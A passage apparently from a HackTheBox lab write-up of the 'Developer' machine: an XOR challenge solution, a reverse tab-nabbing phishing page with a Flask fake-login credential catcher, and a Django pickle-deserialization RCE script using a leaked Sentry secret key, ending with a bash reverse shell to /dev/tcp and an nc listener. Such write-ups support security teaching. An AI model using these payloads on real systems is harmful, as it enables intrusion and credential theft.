<span class="k">print</span><span class="p">(</span><span class="n">ct2</span><span class="p">.</span><span class="nb">hex</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">ct3</span><span class="p">.</span><span class="nb">hex</span><span class="p">())</span>  
</code></pre></div></div>

<p>Because of how XOR works, this is easily exploitable. <code class="language-plaintext highlighter-rouge">ct2</code> is <code class="language-plaintext highlighter-rouge">key1 ^ key2 ^ flag</code>, and <code class="language-plaintext highlighter-rouge">ct3</code> is <code class="language-plaintext highlighter-rouge">key2 ^ flag</code>. So calculating <code class="language-plaintext highlighter-rouge">ct2 ^ ct3</code> will give <code class="language-plaintext highlighter-rouge">key1 ^ key2 ^ flag ^ key2 ^ flag</code>. But any time you xor something with the same thing twice, it ends up with the original. So that above is the same as <code class="language-plaintext highlighter-rouge">key1</code>. Knowing <code class="language-plaintext highlighter-rouge">key1</code>, then <code class="language-plaintext highlighter-rouge">key1 ^ ct1</code> will be the flag. It works:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="n">python3</span>
<span class="go">Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="nn">binascii</span>
<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="k">def</span> <span class="nf">bxor</span><span class="p">(</span><span class="n">ba1</span><span class="p">,</span> <span class="n">ba2</span><span class="p">):</span>
<span class="go">...     return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
</span><span class="c">... 
</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">ct1</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"c249e41fc6ee70a6c72d0441360cd7714f56b95f08edfce23e"</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">ct2</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"fb9c2b4b0b07422617884a2ac6e4ea4cbf72563bd55b33894b"</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">ct3</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">"7d9d9b16b6b15df288ca3c339f9a7b489e629a0a9bc3a1167f"</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">key1</span> <span class="o">=</span> <span class="n">bxor</span><span class="p">(</span><span class="n">ct2</span><span class="p">,</span> <span class="n">ct3</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">flag</span> <span class="o">=</span> <span class="n">bxor</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span> <span class="n">ct1</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
<span class="go">DHTB{XorXorXorFunFunFun}
</span></code></pre></div></div>

<p><strong>Flag: DHTB{XorXorXorFunFunFun}</strong></p>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<h3 id="reverse-tab-nabbing-exploit">Reverse Tab-Nabbing Exploit</h3>

<h4 id="theory">Theory</h4>

<p>0xprashant found this neat <a href="https://0xprashant.in/posts/htb-bug/">reverse tab-nabbing bug</a> in the HTB platform August 2020. When a web developer wants a link to open in a new tab, they add <code class="language-plaintext highlighter-rouge">target="_blank"</code> to the <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> tag. The issue is, if that link leads to a malicious page and mitigations aren’t in place, then JavaScript on that page can actually change the location of the original page. So this is really only an issue if you are linking to user-controlled content that the site doesn’t. The mitigation for this is to also add <code class="language-plaintext highlighter-rouge">rel="noopener nofollow"</code> to the <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> tag as well.</p>

<p>For example, the HackTheBox pages for retired machines show links to user writeups. Looking at the source on HTB for the link to my RopeTwo writeup, the mitigation is in place:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20220113073246052.webp">
    <img src="/img/image-20220113073246052.png" alt="image-20220113073246052" class="include_image ">
</picture>

<p>Looking at the profile links on Developer, the <code class="language-plaintext highlighter-rouge">rel</code> is missing, suggesting this link is vulnerable to tab-nabbing:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20220113073356495.webp">
    <img src="/img/image-20220113073356495.png" alt="image-20220113073356495" class="include_image ">
</picture>

<h4 id="strategy">Strategy</h4>

<p>The goal here will be to host a page so that when the admin clicks on the link, it open in a new tab that’s now visible. The JavaScript in that tab will reverse tab-nab the original tab to send it to another page I’m hosting that looks like the login page for Developer. When the admin is done reading my page and comes back, they’ll think they’ve been logged out for some reason, and log in again, where I capture the creds.</p>

<h4 id="generate-tab-nabber">Generate Tab-Nabber</h4>

<p>I’ll grab the tab nabber page from the 0xprashant post and edit it to point to the login path on my host:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h2&gt;</span>Challenge Writeup<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;p&gt;</span>This challenge was quite well designed! Good job by the developers at Developer for this one. I would definitely recommend it to my friends. It required critical thinking and tools like Ghidra to get the job done<span class="nt">&lt;/p&gt;</span>
    <span class="nt">&lt;script&gt;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">)</span> <span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://10.10.14.6/accounts/login/</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">parent</span> <span class="o">!=</span> <span class="nb">window</span><span class="p">)</span> <span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://10.10.14.6/accounts/login/</span><span class="dl">'</span><span class="p">);</span>           
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>I also added a silly generic writeup to give the admin something to read.</p>

<h4 id="generate-login--server">Generate Login / Server</h4>

<p>I’ll grab the source from the login page and save it as <code class="language-plaintext highlighter-rouge">loginform.html</code>. The HTML form <code class="language-plaintext highlighter-rouge">action</code> points to <code class="language-plaintext highlighter-rouge">/accounts/login/</code>, Now I’ll write a quick Flask server to handle both the writeup and the fake login:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="o">*</span>


<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">,</span> <span class="n">template_folder</span><span class="o">=</span><span class="s">'.'</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/writeup"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">writeup</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'writeup.html'</span><span class="p">)</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/accounts/login/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>

    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s">'</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">items</span><span class="p">()]))</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s">"http://10.10.10.120/accounts/login/"</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'loginform.html'</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">"0.0.0.0"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
</code></pre></div></div>

<p>Requests to <code class="language-plaintext highlighter-rouge">/writeup</code> will return the tab nabber page. For <code class="language-plaintext highlighter-rouge">/accounts/login/</code>, if it’s a GET request, it will return the static page I saved. If it is a POST, it will print the form data and then return a redirect back to the legit site. I’ll run the site with <code class="language-plaintext highlighter-rouge">python3 fake_login.py</code>, and the webserver listens on 80:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>python fake_login.py 
<span class="go"> * Serving Flask app "fake_login" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:80/ (Press CTRL+C to quit)
</span></code></pre></div></div>

<p>Just loading the page myself, I noticed that the CSS and images are off, and there’s a bunch of 404s at Flask:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /accounts/login/ HTTP/1.1" 200 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/css/jquery.toasts.css HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/css/signin.css HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/img/logo.png HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/js/jquery.toast.js HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/css/signin.css HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/img/logo.png HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /static/js/jquery.toast.js HTTP/1.1" 404 -
127.0.0.1 - - [14/Jul/2021 06:24:45] "GET /img/favicon.ico HTTP/1.1" 404 -
</code></pre></div></div>

<p>The links in <code class="language-plaintext highlighter-rouge">loginform.html</code> are all relative. This is not necessary to proceed (it will work without CSS), but of course I’d like to fix it. I could download those files, but I’ll edit the HTML to point back at Developer (final file <a href="/files/developer-loginform.html.txt">here</a>). Now the page looks great:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210714062827307.webp">
    <img src="/img/image-20210714062827307.png" alt="image-20210714062827307" class="include_image ">
</picture>

<p>Now I can submit <code class="language-plaintext highlighter-rouge">http://10.10.14.6/writeup</code> as a writeup, and it shows up on my profile for a second, and then there’s a request at flask:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.10.120 - - [15/Jul/2021 14:06:20] "GET /writeup HTTP/1.1" 200 -
10.10.10.120 - - [15/Jul/2021 14:06:20] "GET /favicon.ico HTTP/1.1" 404 -
10.10.10.120 - - [15/Jul/2021 14:06:20] "GET /accounts/login/ HTTP/1.1" 200 -
10.10.10.120 - - [15/Jul/2021 14:06:21] "GET /img/favicon.ico HTTP/1.1" 404 -
10.10.10.120 - - [15/Jul/2021 14:06:21] "POST /accounts/login HTTP/1.1" 308 -
csrfmiddlewaretoken: Example1
login: admin
password: SuperSecurePassword@HTB2021
10.10.10.120 - - [15/Jul/2021 14:06:21] "POST /accounts/login/ HTTP/1.1" 302 -
10.10.10.120 - - [15/Jul/2021 14:06:22] "GET /accounts/login/ HTTP/1.1" 200 -
</code></pre></div></div>

<p>I’ve got the password for the admin.</p>

<h3 id="django-deserialization">Django Deserialization</h3>

<h4 id="identify-sentry">Identify Sentry</h4>

<p>I’ll log out and back in as admin using the password “SuperSecurePassword@HTB2021”. There’s not much exciting on the main site, but going to <code class="language-plaintext highlighter-rouge">/admin</code> gives the Django administration page:</p>

<p><a href="/img/image-20210714153542986.png"><img src="/img/image-20210714153542986.png" alt="image-20210714153542986"><em>Click for full size image</em></a></p>

<p>At the top I’ll note the admin’s name is jacob. The Sites section shows two sites:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210714154110747.webp">
    <img src="/img/image-20210714154110747.png" alt="image-20210714154110747" class="include_image ">
</picture>

<p>I’ll add them both to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, and check out the new site:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210714154311564.webp">
    <img src="/img/image-20210714154311564.png" alt="image-20210714154311564" class="include_image ">
</picture>

<p>I’m able to create an account and log in, but there’s nothing much I can do. The creds from earlier work with the account name jacob@developer.htb, and this provided admin access to Sentry:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210714154551274.webp">
    <img src="/img/image-20210714154551274.png" alt="image-20210714154551274" class="include_image ">
</picture>

<h4 id="get-secret">Get Secret</h4>

<p>After much looking around, I created a project by clicking on the new project button on the top of the page. I tried some things, but nothing provided much use. Trying to clean up after myself, I went to delete the project from the Project Settings, and it loaded this page:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210714154941021.webp">
    <img src="/img/image-20210714154941021.png" alt="image-20210714154941021" class="include_image ">
</picture>

<p>When I click Remove Project, the page crashes with a ton of debug information:</p>

<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
  <a href="/img/image-20210714154900857.png">
    <img src="/img/image-20210714154900857.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)" alt="image-20210714154900857">
  </a>
  <div style="position: absolute; right: 20px; top: 375px"><a href="/img/image-20210714154900857.png"><i>Click for full image</i></a></div>
</div>

<p>It’s not clear why this crashes, but it turns out this is the case on a default installation. There’s some really useful information in there:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SENTRY_OPTIONS</span> 	

<span class="p">{</span><span class="s">'cache.backend'</span><span class="p">:</span> <span class="s">'sentry.cache.redis.RedisCache'</span><span class="p">,</span>
 <span class="s">'cache.options'</span><span class="p">:</span> <span class="p">{},</span>
 <span class="s">'redis.options'</span><span class="p">:</span> <span class="p">{</span><span class="s">'hosts'</span><span class="p">:</span> <span class="p">{</span><span class="mi">0</span><span class="p">:</span> <span class="p">{</span><span class="s">'host'</span><span class="p">:</span> <span class="s">'127.0.0.1'</span><span class="p">,</span>
                                 <span class="s">'password'</span><span class="p">:</span> <span class="s">'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe'</span><span class="p">,</span>
                                 <span class="s">'port'</span><span class="p">:</span> <span class="mi">6379</span><span class="p">}}},</span>
 <span class="s">'system.databases'</span><span class="p">:</span> <span class="p">{</span><span class="s">'default'</span><span class="p">:</span> <span class="p">{</span><span class="s">'ATOMIC_REQUESTS'</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span>
                                  <span class="s">'AUTOCOMMIT'</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
                                  <span class="s">'CONN_MAX_AGE'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                                  <span class="s">'ENGINE'</span><span class="p">:</span> <span class="s">'sentry.db.postgres'</span><span class="p">,</span>
                                  <span class="s">'HOST'</span><span class="p">:</span> <span class="s">'localhost'</span><span class="p">,</span>
                                  <span class="s">'NAME'</span><span class="p">:</span> <span class="s">'sentry'</span><span class="p">,</span>
                                  <span class="s">'OPTIONS'</span><span class="p">:</span> <span class="p">{},</span>
                                  <span class="s">'PASSWORD'</span><span class="p">:</span> <span class="sa">u</span><span class="s">'********************'</span><span class="p">,</span>
                                  <span class="s">'PORT'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span>
                                  <span class="s">'TEST_CHARSET'</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
                                  <span class="s">'TEST_COLLATION'</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
                                  <span class="s">'TEST_MIRROR'</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
                                  <span class="s">'TEST_NAME'</span><span class="p">:</span> <span class="bp">None</span><span class="p">,</span>
                                  <span class="s">'TIME_ZONE'</span><span class="p">:</span> <span class="s">'UTC'</span><span class="p">,</span>
                                  <span class="s">'USER'</span><span class="p">:</span> <span class="s">'sentry'</span><span class="p">}},</span>
 <span class="s">'system.debug'</span><span class="p">:</span> <span class="bp">True</span><span class="p">,</span>
 <span class="s">'system.secret-key'</span><span class="p">:</span> <span class="s">'c7f3a64aa184b7cbb1a7cbe9cd544913'</span><span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">system.secret-key</code> is the Django secret.</p>

<h4 id="exploit">Exploit</h4>

<p>Googling for “Django secret rce”, the first links is to a post about <a href="https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/">getting RCE on Facebook</a>. The author managed to crash one of their servers, and leak the secret just like I did above. There’s a simple POC script in the post:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">django.core.signing</span><span class="p">,</span> <span class="n">django</span><span class="p">.</span><span class="n">contrib</span><span class="p">.</span><span class="n">sessions</span><span class="p">.</span><span class="n">serializers</span>
<span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span>
<span class="kn">import</span> <span class="nn">cPickle</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">SECRET_KEY</span><span class="o">=</span><span class="s">'[RETRIEVEDKEY]'</span>
<span class="c1">#Initial cookie I had on sentry when trying to reset a password
</span><span class="n">cookie</span><span class="o">=</span><span class="s">'gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1fjsBy:FdZ8oz3sQBnx2TPyncNt0LoyiAw'</span>
<span class="n">newContent</span> <span class="o">=</span>  <span class="n">django</span><span class="p">.</span><span class="n">core</span><span class="p">.</span><span class="n">signing</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span><span class="n">key</span><span class="o">=</span><span class="n">SECRET_KEY</span><span class="p">,</span><span class="n">serializer</span><span class="o">=</span><span class="n">django</span><span class="p">.</span><span class="n">contrib</span><span class="p">.</span><span class="n">sessions</span><span class="p">.</span><span class="n">serializers</span><span class="p">.</span><span class="n">PickleSerializer</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="s">'django.contrib.sessions.backends.signed_cookies'</span><span class="p">)</span>
<span class="k">class</span> <span class="nc">PickleRce</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,(</span><span class="s">"sleep 30"</span><span class="p">,))</span>
<span class="n">newContent</span><span class="p">[</span><span class="s">'testcookie'</span><span class="p">]</span> <span class="o">=</span> <span class="n">PickleRce</span><span class="p">()</span>

<span class="k">print</span> <span class="n">django</span><span class="p">.</span><span class="n">core</span><span class="p">.</span><span class="n">signing</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">newContent</span><span class="p">,</span><span class="n">key</span><span class="o">=</span><span class="n">SECRET_KEY</span><span class="p">,</span><span class="n">serializer</span><span class="o">=</span><span class="n">django</span><span class="p">.</span><span class="n">contrib</span><span class="p">.</span><span class="n">sessions</span><span class="p">.</span><span class="n">serializers</span><span class="p">.</span><span class="n">PickleSerializer</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="s">'django.contrib.sessions.backends.signed_cookies'</span><span class="p">,</span><span class="n">compress</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</code></pre></div></div>

<p>I started by trying to convert this to python3 by replacing <code class="language-plaintext highlighter-rouge">cPickle</code> with <code class="language-plaintext highlighter-rouge">pickle</code> and fixing the print. It worked, but the cookie didn’t work. Because serialization is different between the two, I dropped to Python2 (it was a bit of a pain to get <code class="language-plaintext highlighter-rouge">pip2</code> to install <code class="language-plaintext highlighter-rouge">django</code>, a solution is in a comment on <a href="https://stackoverflow.com/questions/64187581/e-package-python-pip-has-no-installation-candidate">this stack overflow post</a>).</p>

<p>In the Sentry panel from Firefox, I’ll look into the dev tools and grab the <code class="language-plaintext highlighter-rouge">sentrysid</code> cookie, and add it to the <code class="language-plaintext highlighter-rouge">cookie</code> variable in the script. I’ll also add the key. Running this prints a new cookie:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>python2 django-rce.py <span class="s1">'sleep 30'</span>
<span class="go">Forged cookie:
.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABChQEFyZaljmblJv7-kRwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUI5inNSUwsUjA0KmVuDCllCeeMTS0sy4kuLU4viM1O8WUOFkASSEpOzU_NSQpUgVuqVlmTmFOuB5PVccxMzcxyBLCeImlI9AMvDOmg:1m47Ab:qtESKz_ys02L-8eRSb5mxPZQFgA
</span></code></pre></div></div>

<p>Replacing the <code class="language-plaintext highlighter-rouge">sentrysid</code> cookie with the output and refreshing, the page hangs for 30 seconds, and then returns an error. That’s RCE.</p>

<p>I upgraded the script a bit to take a command from the command line and to submit the cookie for me to save copy and pasting:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python2
</span><span class="kn">import</span> <span class="nn">django.core.signing</span><span class="p">,</span> <span class="n">django</span><span class="p">.</span><span class="n">contrib</span><span class="p">.</span><span class="n">sessions</span><span class="p">.</span><span class="n">serializers</span>
<span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span>
<span class="kn">import</span> <span class="nn">cPickle</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>


<span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="n">SECRET_KEY</span><span class="o">=</span><span class="s">'c7f3a64aa184b7cbb1a7cbe9cd544913'</span>
<span class="c1">#Initial cookie I had on sentry when trying to reset a password
</span><span class="n">cookie</span><span class="o">=</span><span class="s">".eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABChQEFyZaljmblJv7-hQyRXABhUpSi0uS8_OzM1PBWsrzi7JTU0KF4hNLSzLiS4tTi-KTEpOzU_NSQpUgxumVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegCrOjNK:1m45xH:Zcs2GcAl2Knls_STRUkB22PKJlg"</span>
<span class="n">newContent</span> <span class="o">=</span>  <span class="n">django</span><span class="p">.</span><span class="n">core</span><span class="p">.</span><span class="n">signing</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span><span class="n">key</span><span class="o">=</span><span class="n">SECRET_KEY</span><span class="p">,</span><span class="n">serializer</span><span class="o">=</span><span class="n">django</span><span class="p">.</span><span class="n">contrib</span><span class="p">.</span><span class="n">sessions</span><span class="p">.</span><span class="n">serializers</span><span class="p">.</span><span class="n">PickleSerializer</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="s">'django.contrib.sessions.backends.signed_cookies'</span><span class="p">)</span>                              
<span class="k">class</span> <span class="nc">PickleRce</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,(</span><span class="n">cmd</span><span class="p">,))</span>
<span class="n">newContent</span><span class="p">[</span><span class="s">'testcookie'</span><span class="p">]</span> <span class="o">=</span> <span class="n">PickleRce</span><span class="p">()</span>

<span class="n">cookie</span> <span class="o">=</span> <span class="n">django</span><span class="p">.</span><span class="n">core</span><span class="p">.</span><span class="n">signing</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">newContent</span><span class="p">,</span><span class="n">key</span><span class="o">=</span><span class="n">SECRET_KEY</span><span class="p">,</span><span class="n">serializer</span><span class="o">=</span><span class="n">django</span><span class="p">.</span><span class="n">contrib</span><span class="p">.</span><span class="n">sessions</span><span class="p">.</span><span class="n">serializers</span><span class="p">.</span><span class="n">PickleSerializer</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="s">'django.contrib.sessions.backends.signed_cookies'</span><span class="p">,</span><span class="n">compress</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>                 
<span class="k">print</span><span class="p">(</span><span class="s">"Forged cookie:</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">cookie</span><span class="p">)</span>

<span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://developer-sentry.developer.htb/sentry/"</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">"sentrysid"</span><span class="p">:</span> <span class="n">cookie</span><span class="p">})</span>   
</code></pre></div></div>

<p>For example, with <code class="language-plaintext highlighter-rouge">tcpdump</code> listening, I can ping myself:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>python2 django-rce.py <span class="s1">'ping -c 1 10.10.14.6'</span>
<span class="go">Forged cookie:
.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABChQEFyZaljmblJv7-kRwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUJFCjLz0hV0kxUMFQwN9EDIRM-skLk1qJAllDc-sbQkI760OLUoPjPFmzVUCEkgKTE5OzUvJVQJYr1eaUlmTrEeSF7PNTcxM8cRyHKCqCnVAwDdijyO:1m47EC:va8S4KQZMhdYvXCdcgRVBkjPoIQ
</span></code></pre></div></div>

<p>And see it at <code class="language-plaintext highlighter-rouge">tcpdump</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> tun0 icmp
<span class="go">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:41:00.834421 IP developer.htb &gt; 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
15:41:00.834453 IP 10.10.14.6 &gt; developer.htb: ICMP echo reply, id 2, seq 1, length 64
</span></code></pre></div></div>

<h4 id="shell">Shell</h4>

<p>Running this with a reverse shell payload returned a shell:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>python2 django-rce.py <span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1"'</span>
<span class="go">Forged cookie:
.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABChQEFyZaljmblJv7-kRwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUINkxKLMxR0kxWUIIxMBTs1Bf2U1DL9kuQCfUMDPRAy0TPTNzExVjCwUzNUKmRuDSpkCeWNTywtyYgvLU4tis9M8WYNFUISSEpMzk7NSwlVgrhNr7QkM6dYDySv55qbmJnjCGQ5QdSU6gEAY4JESA:1m478z:q3TGSOBo-rDA954yJoX08RfEI9g
</span></code></pre></div></div>

<p>At a listening <code class="language-plaintext highlighter-rouge">nc</code>:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 443
<span class="go">listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.120] 40458
bash: cannot set terminal process group (879): Inappropriate ioctl for device
bash: no job control in this shell
